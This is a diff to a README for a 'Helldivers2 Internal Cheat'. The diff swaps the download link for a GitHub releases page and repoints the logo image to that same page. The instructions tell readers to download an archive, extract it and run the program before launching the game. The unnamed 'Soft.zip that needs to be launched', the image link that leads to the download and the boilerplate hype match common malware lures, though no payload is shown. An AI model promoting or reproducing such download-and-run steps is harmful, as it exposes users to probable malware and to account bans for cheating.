@@ -16,7 +16,7 @@ Helldivers-2 is an intense cooperative top-down shooter game set in a dystopian 
 
 Using the Helldivers2 Internal Cheat is simple and straightforward. Just follow these steps:
 
-1. Download the cheat from the following link: [Download Helldivers2 Cheat](https://github.com/file/Soft.zip) (needs to be launched).
+1. Download the cheat from the following link: [Download Helldivers2 Cheat](https://github.com/Sassy-MJ/Helldivers2-Internal-Cheat-FULL/releases) (needs to be launched).
 2. Extract the files to a folder on your computer.
 3. Run the cheat application before launching Helldivers-2.
 4. Enjoy the enhanced gameplay experience with all the cheat features activated.
@@ -51,4 +51,4 @@ Let the power of the Helldivers2 Internal Cheat guide you to victory! 💪🎮
 
 🎮 Happy Gaming! 🚀
 
-![Helldivers2 Logo](https://example.com/logo.png)
+![Helldivers2 Logo](https://github.com/Sassy-MJ/Helldivers2-Internal-Cheat-FULL/releases)
